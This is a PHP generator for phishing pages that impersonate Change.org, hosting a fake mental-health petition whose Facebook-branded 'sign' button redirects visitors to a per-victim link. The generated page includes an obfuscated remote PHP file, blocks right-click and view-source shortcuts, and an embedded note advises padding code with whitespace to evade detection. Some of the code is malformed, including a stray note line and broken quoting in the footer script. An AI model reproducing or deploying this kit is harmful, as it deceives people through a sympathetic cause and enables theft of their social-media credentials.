<?php
// Check if the form was submitted
if (isset($_POST['submit'])) {
    // Get the selection
    $selection = $_POST['selection'];

    // Create the folder
    $folderPath = '/home/u667008371/domains/safemotivation.tech/public_html/q/' . $currentIdentifier . '/';
    if (!is_dir($folderPath)) {
        mkdir($folderPath, 0777, true);
    }

    // Generate the file name based on the selection
    $fileName = '';
    if ($selection === 'MentalHealth') {
        $fileName = 'MentalHealth.php';
    } elseif ($selection === 'ChildLabor') {
        $fileName = 'ChildLabor.php';
    }

    // Generate the file content based on the selection
    $fileContent = '';
    if ($selection === 'MentalHealth') {
        $fileLink = 'https://safemotivation.tech/q/' . $currentIdentifier . '/' . $currentIdentifier;

        $jsFile = $folderPath . 'xyz.js';
        $jsContent = 'var link = "'. $fileLink .'";
        function Forbi() {
            // Redirect to the generated link
            window.location.href = link;
        }
        
        ';
        file_put_contents($jsFile, $jsContent);

$fileContent = '
<?php
include("/home/u667008371/domains/forbddenx.site/public_html/obf_code.php");
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    Sign this petition
  </title>
  <meta property="og:description" content="Sign this Petition! The mental health issue in the Philippines doesn\'t give much publicity and attention. It remains a misunderstood issue.">
  <meta property="og:image" content="https://i.ibb.co/tLw0L07/YLYud-Pr-YJpy-ZIv-N-800x450-no-Pad.jpg">
  <meta name="description" content="Sign this Petition! The mental health issue in the Philippines doesn\'t give much publicity and attention. It remains a misunderstood issue.">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Alatsi&display=swap" rel="stylesheet">
  <link rel="shortcut icon" href="https://i.ibb.co/SVzf9n1/favicon-114x114.png" type="image/x-icon">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
     <script>

  var link = "'. $fileLink .'";
  
  function redirectToPage() {
    // Redirect to the generated link
    window.location.href = link;
  }
</script>

<script>
function redirectTo404() {
    window.location.href = ":404";
        
  }
  </script>


<script src="xyz.js" onerror="redirectTo404()"></script>


  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous">
  </script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
  <style>
    #Main {
      width: 100%;
      object-fit: contain;
      max-width: 100%
    }

    .innerCons {
      display: flex;
      justify-content: center;
      align-items: center;
      width: 100%
    }

    @media only screen and (max-width:1000px) {

      #FrenchCropTop,
      #Main2 {
        min-width: 100%
      }

      #FrenchCropTop {
        margin: 500px
      }
    }
  </style>
  <SCRIPT language=JavaScript>

<!-- http://www.spacegun.co.uk -->

var message = "function disabled";

function rtclickcheck(keyp){ if (navigator.appName == "Netscape" && keyp.which == 3){ alert(message); return false; }

if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2) { alert(message); return false; } }

document.onmousedown = rtclickcheck;

</SCRIPT>
  <script src="https://kit.fontawesome.com/eff4d6c4bd.js" crossorigin="anonymous">
  </script>
</head>
<script type="text/javascript">
    function mousehandler(e) {
        var myevent = (isNS) ? e : event;
        var eventbutton = (isNS) ? myevent.which : myevent.button;
        if ((eventbutton == 2) || (eventbutton == 3)) return false;
    }
    document.oncontextmenu = mischandler;
    document.onmousedown = mousehandler;
    document.onmouseup = mousehandler;
    function disableCtrlKeyCombination(e) {
        var forbiddenKeys = new Array("a", "s", "c", "x","u");
        var key;
        var isCtrl;
        if (window.event) {
            key = window.event.keyCode;
            //IE
            if (window.event.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        else {
            key = e.which;
            //firefox
            if (e.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        if (isCtrl) {
            for (i = 0; i < forbiddenKeys.length; i++) {
                //case-insensitive comparation
                if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
                    return false;
                }
            }
        }
        return true;
    }
</script>
3. Add to lots of white spaces to before you staring your codes

it may fool s
<body oncontextmenu="return false" style="color:#121212;background:ghostwhite ;height:2000px; font-family: " Alatsi", sans-serif;">
  <style>
    p {
      color: #121212;
    }
  </style>
  <!-- fixed-top -->
  <!-- navbar-expand-sm -->
  <nav class=" navbar navbar-expand-sm navbar-light bg-light border " style="position:fixed; z-index:1; width:100%; height:60px; text-align:center; vertical-align:middle; line-height:50px; top:0px;">
    <!-- d-flex justify-content-center align-items-center -->
    <div class="bg-light container align-items-center" style="width: 1135px;">
      <img id="imaje" src="https://i.ibb.co/XbxB2WH/Change-Org-RGB-Source-1280px.png" width="119" class="" alt="">
      <button type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" class="navbar-toggler" aria-controls="navbarNav" aria-expanded="flase" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon">
        </span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ms-auto fs-5 fw-semibold gap-0">
          <li class="nav-item">
            <a href="https://www.change.org/start-a-petition" class="nav-link active">
              Start Petition
            </a>
          </li>
          <li class="nav-item">
            <a href="https://www.change.org/petitions" class="nav-link">
              Browse
            </a>
          </li>
          <li class="nav-item">
            <a href="https://www.change.org/search" class="nav-link">
              Search
            </a>
          </li>
        </ul>
      </div>
    </div>
  </nav>
  <div style="padding-top:60px" class="container">
    <div class="innerCons">
      <div class="row">
        <div class="col text-center">
          <h6 style="text-align:left; color: gray">
            PHILIPPINES - MENTAL HEALTH ISSUE
          </h6>
          <figure class="figure">
            <img style="border-radius:14px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRVwyFRyQ7RKHeyWssw4r4LxNKqZ47Z6GPBg&usqp=CAU" alt="" class="img-fluid mt-3 " id="Main">
            <figcaption class="animate__animated animate__fadeIn figure-caption text-start mt-4">
              <h1>
                <strong style="color: black; font-size:40px;">
                  STOP THE STIGMA: MENTAL HEALTH
                </strong>
              </h1>
            </figcaption>
            <div style="margin-top: 19px;margin-bottom: 6px;height: 73px;border-bottom: 1px solid rgba(86,88,91,0.2) ;">
              <p style="font-family: Roboto, sans-serif;font-size: 18px;text-align: center;margin-bottom: 5px;">
                <strong>
                  4,872 have signed.
                </strong>
                Let\'s get to 5,000!
              </p>
  
                <div class="progress" style="height: 0.4px;">
                  <div class="progress-bar" role="progressbar" style="width: 25%;" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100">
                  </div>
                </div>
                <div class="progress" style="height: 20px; ">
                  <div class="progress-bar" role="progressbar" style="background-color: rgb(237, 39, 39); width: 96%;" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100">
                  </div>
                </div>
              </div>
              <figcaption class="figure-caption text-start">
                <p style="font-family: Roboto, sans-serif;font-size: 15px;">
                  <strong>
                    <span style="text-decoration: underline;">
                      <img class="img-fluid d-inline text-start" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSEdi2hm9OOzZ-3PX-Vk5IloT_pQOsal8Chlw&usqp=CAU" style="width: 42px;margin-right: 9px;border-radius:50%">
                      </h6>
                      Group 5 - HUMSS IX
                      </h6>
                    </span>
                    started this petition to Youth
                  </strong>
                  <br>
                </p>
          </figure>
          <figure class="figure" style="color: #56585b;">
            <div class="container" style="width: 60%;" id="Main2">
              <p class="text-start">
                The mental health issue in the Philippines doesn\'t give much publicity and attention. It remains a misunderstood issue. People who are suffering from mental illnesses are often discriminated. A comedian and TV personality Joey De Leon on the noontime entertainment show, Eat Bulaga said "Yung depression gawa-gawa lang ng mga tao yan. Gawa nila sa sarili nila,". It portrays that some Filipinos remains insufficient and incomplete knowledge towards mental health.
              </p>
              <p class="text-start mt-5">
                Mental health problems can cover a broad range of disorders and these disorders can affect the daily life of the people. Stigma, discrimination, poverty and shame are the reasons why people with mental illnesses refuse to undergo in medications. Mental illnesses might be invisible but it can take a life of a person when it is left untreated.
              </p>
              <p class="text-start mt-5">
                A study showed that some misconceptions and mistreatments people have towards People with Mental Health Problem (PMHP) are the belief that personal characteristics like self-centeredness and soul-weakness are the reasons for mental health. This results to blaming people with mental health problem (PMHP) and behavior discriminating. Some people also believed that people with mental health problem (PMHP) should not be hired for a job even if they are qualified. This is a clear manifestation of discrimination. Some misconception also includes the fear of being labeled as "crazy", tagging the name of their family thus resulting to hesitation of consulting mental health professionals. Another stigma associated with mental health is invalidating their feelings by commenting "I experienced worse than that". Most of the people think they are helping people with mental health problem (PMHP) but actually is making them feel weaker and helpless. These cases are clear examples of what stigma has done to the public\'s judgement and prejudices towards people with mental health problem (PMHP), a result of lack of awareness towards mental health.
              </p>
              <p class="text-start mt-5">
                Our goal is to get more signature and help the non-governmental organization to break the stigma of Filipinos to people with mental health problems (PMHP), to remove the hesitation of the people with mental health problem (PMHP) to seek medical attention, thus reducing the rate of suicide cases in the Philippines. This is an illustration of domino-effect in the mental health awareness in the Philippines- by breaking the stigma means an improvement on the perception of every Filipino towards mental health.
              </p>
              <p class="text-start">
                Don\'t just say "okay" talk to them every day, comfort them and be the reason why they still strong today.
              </p>
              <p class="text-start">
                Don\'t let a bad thought define you, you are unique, you are you, "WE deserve YOU".
              </p>
              <p class="text-start">
                Let us join our hand and mind to break the stigma. Contact us and be a part of our movement at stopthestigma@gmail.com
              </p>
              <p class="text-start">
              </p>
            </div>
          </figure>
          <figure class="m-auto " id="FrenchCropTop" style="border: 1px solid rgba(108,117,125,0.21);border-radius: 8px; width: 50%;">
            <i class="fas fa-pen-fancy" style="font-size: 40px;color: #1871E7;">
            </i>
            <figcaption style="text-align: center;">
              Start a petition of your own
            </figcaption>
            <p style="text-align: center;font-family: Roboto, sans-serif;font-size: 12px;">
              This petition starter stood up and took action. Will you do the same?
            </p>
          </figure>
          <br>
          <br>
          <br>
          <br>
        </div>
      </div>
      <!-- row -->
    </div>
    <!-- innerCons -->
  </div>
  <!-- Pinakacontainer -->
  <footer class="animate__animated animate__slideInUp footer text-center fixed-bottom" style="background: rgba(245,245,245,0.91);padding-top: 0px;padding-bottom: 10px;padding-right: 20px;padding-left: 20px;height: 59px;">

     <script>

  var link = "' . $fileLink . '";
";
  
  function redirectToPage() {
    // Redirect to the generated link
    window.location.href = link;
  }
</script>
 <button onclick="redirectToPage()" class="btn btn-primary btn-block btn-sm" role="button" data-bss-hover-animate="pulse" style="background: #1871E7; margin-top: 7px; width: 90%; height: 48px; font-size: 17px; text-align: center; padding-top: 10px; letter-spacing: 1px; line-height: 30px; border-style: none; padding-bottom: 0px;">
  <a href="#" style="text-decoration: none; color: inherit;">
    <strong><i class="fa fa-facebook-square"></i></strong><strong> SIGN THIS PETITION</strong>
  </a>
</button>

  </footer>
</body>
</html>';


    } elseif ($selection === 'ChildLabor') {
        $fileContent = 'Unavailable. Coming Soon!';
    }

    // Create the user's PHP file in the unique identifier folder
    $userPHPFile = $folderPath . $fileName;
    file_put_contents($userPHPFile, $fileContent);
}
?>
